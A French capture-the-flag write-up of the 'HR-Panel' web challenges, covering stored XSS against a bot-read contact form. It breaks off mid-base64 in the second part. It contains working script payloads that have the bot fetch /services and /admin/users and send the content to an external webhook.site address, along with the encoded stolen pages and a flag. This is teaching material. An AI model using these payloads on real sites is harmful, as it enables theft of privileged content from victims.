# HR-Panel ( 1,2 & 3 ) - By Worty


## TLDR :
* XSRF afin de forcer le bot de maintenance à nous afficher du contenu inaccessible
* LFI via XXE sur un .docx
* RCE via création d'un fichier PHP sur le serveur

# HR-Panel 1 - 150pts

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/hrpanel1.png" />
</p>

## Étape 1 : Découverte du site

Lorsque l'on arrive sur le site, nous sommes face à une page classique avec la possibilité de s'inscrire puis de se connecter.
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/discover.gif" />
</p>

Un premier réflexe est de regarder dans le fichier robots.txt à la racine du site. 
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/robots.png" />
</p>


On y découvre un fichier intéressant qui ne doit pas être pris en charge par les web crawlers de Google : .htaccess
En tentant d'y accéder directement, on observe que la ressource existe bel et bien mais que nous ne sommes pas autorisés à y accéder.

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/htaccess.png" />
</p>

Après quelques tests infructueux sur des failles classiques sur la partie du login (SQLi etc ...), on décide de simplement créer un compte (_on remarque dans le code source des restrictions sur la syntaxe du mail "*@inter-iut.fr" et de l'ID "[A-Z][0-9]-[0-9]{3}-[A-Z]{2}")_
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/register.png" />
</p>

On y aperçoit 3 nouveaux liens dans le menu du haut :
* Services (Accessible depuis notre compte)
* My account (Qui liste les informations du compte avec la possibilité de changer de mot de passe)
* Contact (Un formulaire de contact qui permet de demander de l'aide)

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/login.gif" />
</p>

Il est alors judicieux d'aller investiguer cette fameuse fonctionnalité permettant de contacter quelqu'un. Le premier réflexe est de tester si le message envoyé est traité côté serveur afin de supprimer des éventuelles balises de script qui pourront exécuter du Javascript. On teste donc la payload suivante qui, si elle fonctionne redirigera la personne qui lit ce message sur notre site.  
  
```html
<script>document.location="https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd"</script>
```
 
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/xss_test.png" />
</p>

Après quelques secondes on reçoit bien une requête sur notre site, indiquant la validité d'une faille XSS sur la page de contact.
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/0f1001f5ba6adae63860a7a29c0121275fb21f1f/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/hit_test_xss.png" />
</p>

## Étape 2 : Exploitation de la faille XSS

La suite logique de cette faille va être de forcer l'entité qui lit notre message (en l'occurrence un bot au vu de l'header REFERER reçu dans la réponse de la requête) à réaliser des actions à notre place, en espérant qu'elle dispose de plus de privilèges que nous. Ce que l'on souhaiterait dans un premier temps c'est d'accéder au contenu de la page /services . On va donc utiliser la payload suivante afin de forcer le bot à récupérer son contenu, l'encoder en base64 puis l'envoyer sur notre site.
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET','/services',false);
  xhr.send();
  document.location="https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd/?content=".concat(btoa(btoa(xhr.responseText)));
</script>
```
( *Pour ce writeup vous noterons le double encodage en base64, ce n'est pas quelquechose que j'avais utilisé lors du CTF puisque je passait directement sur mon VPS, mais pour une raison que j'ignore encore c'est le seul moyen de récupèrer sur le site les données sans problème)*


Après quelques secondes, nous recevons une magnifique requete avec beaucoup de contenu en base64, il s'agit en faite de la page /services, après **double** décodage on obtient : 

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/hit_xss_page_services.png" />
</p>

***
<details>
<summary>Page /services double encodé en base64</summary>
<pre>
UENGRVQwTlVXVkJGSUVoVVRVdytDanhvWldGa1Bnb2dJQ0FnUEhScGRHeGxQa2x1ZEdWeUlFbFZWQ0F0SUVoMWJXRnVJRkpsYzI5MWNtTmxjend2ZEdsMGJHVStDaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStDaUFnSUNBOGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUltaDBkSEJ6T2k4dmMzUmhZMnR3WVhSb0xtSnZiM1J6ZEhKaGNHTmtiaTVqYjIwdlltOXZkSE4wY21Gd0x6UXVNeTR4TDJOemN5OWliMjkwYzNSeVlYQXViV2x1TG1OemN5SWdhVzUwWldkeWFYUjVQU0p6YUdFek9EUXRaMmRQZVZJd2FWaERZazFSZGpOWWFYQnRZVE0wVFVRclpFZ3ZNV1pSTnpnMEwybzJZMWt2YVVwVVVWVlBhR05YY2pkNE9VcDJiMUo0VkRKTlduY3hWQ0lnWTNKdmMzTnZjbWxuYVc0OUltRnViMjU1Ylc5MWN5SStDaUFnSUNBOGMyTnlhWEIwSUhOeVl6MGlhSFIwY0hNNkx5OWpiMlJsTG1weGRXVnllUzVqYjIwdmFuRjFaWEo1TFRNdU15NHhMbk5zYVcwdWJXbHVMbXB6SWlCcGJuUmxaM0pwZEhrOUluTm9ZVE00TkMxeE9Ha3ZXQ3M1TmpWRWVrOHdjbFEzWVdKTE5ERktVM1JSU1VGeFZtZFNWbnB3WW5wdk5YTnRXRXR3TkZsbVVuWklLemhoWW5SVVJURlFhVFpxYVhwdklpQmpjbTl6YzI5eWFXZHBiajBpWVc1dmJubHRiM1Z6SWo0OEwzTmpjbWx3ZEQ0S0lDQWdJRHh6WTNKcGNIUWdjM0pqUFNKb2RIUndjem92TDJOa2JtcHpMbU5zYjNWa1pteGhjbVV1WTI5dEwyRnFZWGd2YkdsaWN5OXdiM0J3WlhJdWFuTXZNUzR4TkM0M0wzVnRaQzl3YjNCd1pYSXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMVZUekpsVkRCRGNFaHhaRk5LVVRab1NuUjVOVXRXY0doMFVHaDZWMm81VjA4eFkyeElWRTFIWVROS1JGcDNjbTVSY1RSelJqZzJaRWxJVGtSNk1GY3hJaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnYzNKalBTSm9kSFJ3Y3pvdkwzTjBZV05yY0dGMGFDNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMak11TVM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMUthbE50Vm1kNVpEQndNM0JZUWpGeVVtbGlXbFZCV1c5SlNYazJUM0pSTmxaeWFrbEZZVVptTDI1S1IzcEplRVpFYzJZMGVEQjRTVTByUWpBM2FsSk5JaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtQQzlvWldGa1BnbzhZbTlrZVQ0OGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUlpOWhjM05sZEhNdlkzTnpMMlp2Y20wdVkzTnpJajRLUEc1aGRpQmpiR0Z6Y3owaWJtRjJZbUZ5SUc1aGRtSmhjaTFsZUhCaGJtUXRiR2NnYm1GMlltRnlMV3hwWjJoMElHSm5MV3hwWjJnaVBnb2dJRHhoSUdOc1lYTnpQU0p1WVhaaVlYSXRZbkpoYm1RaUlHaHlaV1k5SWk4aVBnb2dJQ0FnUEdsdFp5QnpjbU05SWk5aGMzTmxkSE12U1cxaFoyVnpMMnh2WjI4dWNHNW5JaUIzYVdSMGFEMGlORFVpSUdobGFXZG9kRDBpTkRBaUlHTnNZWE56UFNKa0xXbHViR2x1WlMxaWJHOWpheUJoYkdsbmJpMTBiM0FpSUdGc2REMGlJajRLSUNBZ0lFbHVkR1Z5SUVsVlZBb2dJRHd2WVQ0S0lDQThaR2wySUdOc1lYTnpQU0pqYjJ4c1lYQnpaU0J1WVhaaVlYSXRZMjlzYkdGd2MyVWlJR2xrUFNKdVlYWmlZWEpPWVhaQmJIUk5ZWEpyZFhBaVBnb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaWJtRjJZbUZ5TFc1aGRpSStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZJajVJYjIxbFBDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUlnYUhKbFpqMGlMMkZrYldsdUwzVnpaWEp6SWo1QlpHMXBiand2WVQ0Z0lDQWdJQ0FnSUR4aElHTnNZWE56UFNKdVlYWXRhWFJsYlNCdVlYWXRiR2x1YXlCaFkzUnBkbVVpSUdoeVpXWTlJaTl6WlhKMmFXTmxjeUkrVTJWeWRtbGpaWE1nSUR4emNHRnVJR05zWVhOelBTSnpjaTF2Ym14NUlqNG9ZM1Z5Y21WdWRDazhMM053WVc0K1BDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUlnYUhKbFpqMGlMMk52Ym5SaFkzUWlQa052Ym5SaFkzUThMMkUrQ2lBZ0lDQWdJQ0FnUEdFZ1kyeGhjM005SW01aGRpMXBkR1Z0SUc1aGRpMXNhVzVySWlCb2NtVm1QU0l2YldVaVBrMTVJR0ZqWTI5MWJuUThMMkUrSUNBS0lDQWdJQ0FnSUNBOFlTQmpiR0Z6Y3owaWJtRjJMV2wwWlcwZ2JtRjJMV3hwYm1zaUlHaHlaV1k5SWk5c2IyZHZkWFFpUGt4dloyOTFkRHd2WVQ0S0lDQWdJRHd2WkdsMlBnb2dJRHd2WkdsMlBnbzhMMjVoZGo0S0lDQWdJQW9nSUNBZ1BHUnBkaUJqYkdGemN6MGlZMjl1ZEdGcGJtVnlJajRLSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKeWIzY2lQZ29nSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMndnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BIQWdZMnhoYzNNOUlteGxZV1FpSUhOMGVXeGxQU0p0WVhKbmFXNHRkRzl3T2lBeU1IQjRPeUJqYjJ4dmNqb2dZbXhoWTJzN0lqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JJWld4c2J5QnlhRjloWkcxcGJsOXpaWEoyYVdObExDQjNhR2xqYUNCelpYSjJhV05sY3lCM2IzVnNaQ0I1YjNVZ2JHbHJaU0IwYnlCMWMyVS9JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZjRDRnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThhSEl2UGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEdScGRpQmpiR0Z6Y3owaWNtOTNJajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMnd0YzIwdE5DSStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpZWEprSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSXpVeU9XSmpNRHNpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtMV0p2WkhraVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG9OU0JqYkdGemN6MGlZMkZ5WkMxMGFYUnNaU0krUVdOalpYTnpJRzE1SUhCaGVTQnpiR2x3Y3p3dmFEVStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbU5oY21RdGRHVjRkQ0krUEdKeVBqeGlkWFIwYjI0Z1kyeGhjM005SW1KMGJpQmlkRzR0Y0hKcGJXRnllU0lnYjI1amJHbGphejBpWkc5amRXMWxiblF1Ykc5allYUnBiMjQ5Snk5elpYSjJhV05sY3k5emJHbHdjeWNpUGtGalkyVnpjend2WW5WMGRHOXVQand2Y0Q0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEM5a2FYWStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMnd0YzIwdE5DSStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpZWEprSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSXpVeU9XSmpNRHNpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtMV0p2WkhraVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG9OU0JqYkdGemN6MGlZMkZ5WkMxMGFYUnNaU0krVFdGdVlXZGxJRzE1SUhaaFkyRjBhVzl1Y3p3dmFEVStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbU5oY21RdGRHVjRkQ0krUEdKeVBqeGlkWFIwYjI0Z1kyeGhjM005SW1KMGJpQmlkRzR0Y0hKcGJXRnllU0lnYjI1amJHbGphejBpWkc5amRXMWxiblF1Ykc5allYUnBiMjQ5Snk5elpYSjJhV05sY3k5MllXTmhkR2x2Ym5NbklqNUJZMk5sYzNNOEwySjFkSFJ2Ymo0OEwzQStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQQzlrYVhZK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQQzlrYVhZK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTI5c0xYTnRMVFFpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtJaUJ6ZEhsc1pUMGlZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2dJelV5T1dKak1Ec2lQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRHhrYVhZZ1kyeGhjM005SW1OaGNtUXRZbTlrZVNJK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThhRFVnWTJ4aGMzTTlJbU5oY21RdGRHbDBiR1VpUGtOeVpXRjBaU0JJVWlCeVpYRjFaWE4wY3lBb1FrVlVRU0JXUlZKVFNVOU9LVHd2YURVK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGlZMkZ5WkMxMFpYaDBJajQ4WW5JK1BHSjFkSFJ2YmlCamJHRnpjejBpWW5SdUlHSjBiaTF3Y21sdFlYSjVJaUJ2Ym1Oc2FXTnJQU0prYjJOMWJXVnVkQzVzYjJOaGRHbHZiajBuTDNObGNuWnBZMlZ6TDNKbGNYVmxjM1J6SnlJK1FXTmpaWE56UEM5aWRYUjBiMjQrUEM5d1Bnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbXhsWVdRaUlITjBlV3hsUFNKamIyeHZjam9nWW14aFkyczdJajVEVkVaSlZWUjdZV0kxTXpBMU16WmtOVEJrTURkbVptUTBNamxoTldaa1kyVmlPVFJqTlRBek1qSmlaREF4Wm1ZM01UZzFNek16TW1OaVpHSTFZVGczT1dFMU1EYzBNbjA4TDNBK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdQQzlrYVhZK0Nqd3ZaR2wyUGdvOFpHbDJJR05zWVhOelBTSm1hWGhsWkMxaWIzUjBiMjBnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBOGNDQnpkSGxzWlQwaVkyOXNiM0k2SUNNMU1qbGlZekE3SWo1SmJuUmxjaUJKVlZRZ1NGSWdVMlZ5ZG1salpYTWdWakV1TVMwNFBDOXdQZ284TDJScGRqNEtQQzlpYjJSNVBnbzhMMmgwYld3Kw==
</pre>
</details>
<details>
  <summary>Page /services</summary>
  
```html
<!DOCTYPE HTML>
<head>
    <title>Inter IUT - Human Resources</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
<body><link rel="stylesheet" href="/assets/css/form.css">
<nav class="navbar navbar-expand-lg navbar-light bg-ligh">
  <a class="navbar-brand" href="/">
    <img src="/assets/Images/logo.png" width="45" height="40" class="d-inline-block align-top" alt="">
    Inter IUT
  </a>
  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav">
        <a class="nav-item nav-link" href="/">Home</a>
        <a class="nav-item nav-link" href="/admin/users">Admin</a>        <a class="nav-item nav-link active" href="/services">Services  <span class="sr-only">(current)</span></a>
        <a class="nav-item nav-link" href="/contact">Contact</a>
        <a class="nav-item nav-link" href="/me">My account</a>  
        <a class="nav-item nav-link" href="/logout">Logout</a>
    </div>
  </div>
</nav>
    
    <div class="container">
        <div class="row">
            <div class="col text-center">
                <p class="lead" style="margin-top: 20px; color: black;">
                    Hello rh_admin_service, which services would you like to use?                </p>                
                <hr/>
                <div class="row">
                    <div class="col-sm-4">
                      <div class="card" style="background-color: #529bc0;">
                        <div class="card-body">
                          <h5 class="card-title">Access my pay slips</h5>
                          <p class="card-text"><br><button class="btn btn-primary" onclick="document.location='/services/slips'">Access</button></p>
                        </div>
                      </div>
                    </div>
                    <div class="col-sm-4">
                      <div class="card" style="background-color: #529bc0;">
                        <div class="card-body">
                          <h5 class="card-title">Manage my vacations</h5>
                          <p class="card-text"><br><button class="btn btn-primary" onclick="document.location='/services/vacations'">Access</button></p>
                        </div>
                      </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="card" style="background-color: #529bc0;">
                          <div class="card-body">
                            <h5 class="card-title">Create HR requests (BETA VERSION)</h5>
                            <p class="card-text"><br><button class="btn btn-primary" onclick="document.location='/services/requests'">Access</button></p>
                          </div>
                        </div>
                    </div>
                  <p class="lead" style="color: black;">CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}</p>
            </div>
        </div>
    </div>
</div>
<div class="fixed-bottom text-center">
      <p style="color: #529bc0;">Inter IUT HR Services V1.1-8</p>
</div>
</body>
</html>
```
</details>

***

Comme vous pouvez le constater, nous observons une ligne intéressante en bas de la page : 

```html 
<p class="lead" style="color: black;">CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}</p>
```
<p align="center">
  <br/>
  <b>FLAG 1 : CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}</b>
</p>
<br/><br/>  

# HR-Panel 2 - 200pts
  
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/hrpanel2.png" />
</p>

En regardant attentivement dans la page que nous avons obtenue précédemment, on observe que ce bot à accès a une fonctionnalité supplémentaire :   
```html 
<a class="nav-item nav-link" href="/admin/users">Admin</a>
```

Procédons alors à la même méthode que précédemment et récupérons le contenu de cette page avec la payload suivante : 

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET','/admin/users',false);
  xhr.send();
  document.location="https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd/?content=".concat(btoa(btoa(xhr.responseText)));
</script>
```

***
<details>
<summary>Page /admin/users double encodé en base64</summary>
<pre>
UENGRVQwTlVXVkJGSUVoVVRVdytDanhvWldGa1Bnb2dJQ0FnUEhScGRHeGxQa2x1ZEdWeUlFbFZWQ0F0SUVoMWJXRnVJRkpsYzI5MWNtTmxjend2ZEdsMGJHVStDaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStDaUFnSUNBOGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUltaDBkSEJ6T2k4dmMzUmhZMnR3WVhSb0xtSnZiM1J6ZEhKaGNHTmtiaTVqYjIwdlltOXZkSE4wY21Gd0x6UXVNeTR4TDJOemN5OWliMjkwYzNSeVlYQXViV2x1TG1OemN5SWdhVzUwWldkeWFYUjVQU0p6YUdFek9EUXRaMmRQZVZJd2FWaERZazFSZGpOWWFYQnRZVE0wVFVRclpFZ3ZNV1pSTnpnMEwybzJZMWt2YVVwVVVWVlBhR05YY2pkNE9VcDJiMUo0VkRKTlduY3hWQ0lnWTNKdmMzTnZjbWxuYVc0OUltRnViMjU1Ylc5MWN5SStDaUFnSUNBOGMyTnlhWEIwSUhOeVl6MGlhSFIwY0hNNkx5OWpiMlJsTG1weGRXVnllUzVqYjIwdmFuRjFaWEo1TFRNdU15NHhMbk5zYVcwdWJXbHVMbXB6SWlCcGJuUmxaM0pwZEhrOUluTm9ZVE00TkMxeE9Ha3ZXQ3M1TmpWRWVrOHdjbFEzWVdKTE5ERktVM1JSU1VGeFZtZFNWbnB3WW5wdk5YTnRXRXR3TkZsbVVuWklLemhoWW5SVVJURlFhVFpxYVhwdklpQmpjbTl6YzI5eWFXZHBiajBpWVc1dmJubHRiM1Z6SWo0OEwzTmpjbWx3ZEQ0S0lDQWdJRHh6WTNKcGNIUWdjM0pqUFNKb2RIUndjem92TDJOa2JtcHpMbU5zYjNWa1pteGhjbVV1WTI5dEwyRnFZWGd2YkdsaWN5OXdiM0J3WlhJdWFuTXZNUzR4TkM0M0wzVnRaQzl3YjNCd1pYSXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMVZUekpsVkRCRGNFaHhaRk5LVVRab1NuUjVOVXRXY0doMFVHaDZWMm81VjA4eFkyeElWRTFIWVROS1JGcDNjbTVSY1RSelJqZzJaRWxJVGtSNk1GY3hJaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnYzNKalBTSm9kSFJ3Y3pvdkwzTjBZV05yY0dGMGFDNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMak11TVM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMUthbE50Vm1kNVpEQndNM0JZUWpGeVVtbGlXbFZCV1c5SlNYazJUM0pSTmxaeWFrbEZZVVptTDI1S1IzcEplRVpFYzJZMGVEQjRTVTByUWpBM2FsSk5JaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtQQzlvWldGa1BnbzhZbTlrZVQ0OGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUlpOWhjM05sZEhNdlkzTnpMMlp2Y20wdVkzTnpJajRLUEc1aGRpQmpiR0Z6Y3owaWJtRjJZbUZ5SUc1aGRtSmhjaTFsZUhCaGJtUXRiR2NnYm1GMlltRnlMV3hwWjJoMElHSm5MV3hwWjJnaVBnb2dJRHhoSUdOc1lYTnpQU0p1WVhaaVlYSXRZbkpoYm1RaUlHaHlaV1k5SWk4aVBnb2dJQ0FnUEdsdFp5QnpjbU05SWk5aGMzTmxkSE12U1cxaFoyVnpMMnh2WjI4dWNHNW5JaUIzYVdSMGFEMGlORFVpSUdobGFXZG9kRDBpTkRBaUlHTnNZWE56UFNKa0xXbHViR2x1WlMxaWJHOWpheUJoYkdsbmJpMTBiM0FpSUdGc2REMGlJajRLSUNBZ0lFbHVkR1Z5SUVsVlZBb2dJRHd2WVQ0S0lDQThaR2wySUdOc1lYTnpQU0pqYjJ4c1lYQnpaU0J1WVhaaVlYSXRZMjlzYkdGd2MyVWlJR2xrUFNKdVlYWmlZWEpPWVhaQmJIUk5ZWEpyZFhBaVBnb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaWJtRjJZbUZ5TFc1aGRpSStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZJajVJYjIxbFBDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUJoWTNScGRtVWlJR2h5WldZOUlpOWhaRzFwYmk5MWMyVnljeUkrUVdSdGFXNGdQSE53WVc0Z1kyeGhjM005SW5OeUxXOXViSGtpUGloamRYSnlaVzUwS1R3dmMzQmhiajQ4TDJFK0lDQWdJQ0FnSUNBOFlTQmpiR0Z6Y3owaWJtRjJMV2wwWlcwZ2JtRjJMV3hwYm1zaUlHaHlaV1k5SWk5elpYSjJhV05sY3lJK1UyVnlkbWxqWlhNOEwyRStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZZMjl1ZEdGamRDSStRMjl1ZEdGamREd3ZZVDRLSUNBZ0lDQWdJQ0E4WVNCamJHRnpjejBpYm1GMkxXbDBaVzBnYm1GMkxXeHBibXNpSUdoeVpXWTlJaTl0WlNJK1RYa2dZV05qYjNWdWREd3ZZVDRnSUFvZ0lDQWdJQ0FnSUR4aElHTnNZWE56UFNKdVlYWXRhWFJsYlNCdVlYWXRiR2x1YXlJZ2FISmxaajBpTDJ4dloyOTFkQ0krVEc5bmIzVjBQQzloUGdvZ0lDQWdQQzlrYVhZK0NpQWdQQzlrYVhZK0Nqd3ZibUYyUGdvOFpHbDJJR05zWVhOelBTSmpiMjUwWVdsdVpYSWlQZ29nSUNBZ1BHUnBkaUJqYkdGemN6MGljbTkzSWo0S0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMndnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHbGtQU0ptYjNKdElqNGdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGliR1ZoWkNJZ2MzUjViR1U5SW1OdmJHOXlPaUFqTlRJNVltTXdPeUkrVjJWc1kyOXRaU0JCWkcxcGJpQWhJRmx2ZFNCallXNGdabWxzYkNCdmRYUWdkR2hsSUdadmNtMGdZbVZzYjNjZ2RHOGdkbVZ5YVdaNUlHRWdkWE5sY2lkeklHRmpZMjkxYm5RdVBDOXdQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG1iM0p0SUcxbGRHaHZaRDBpVUU5VFZDSWdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMl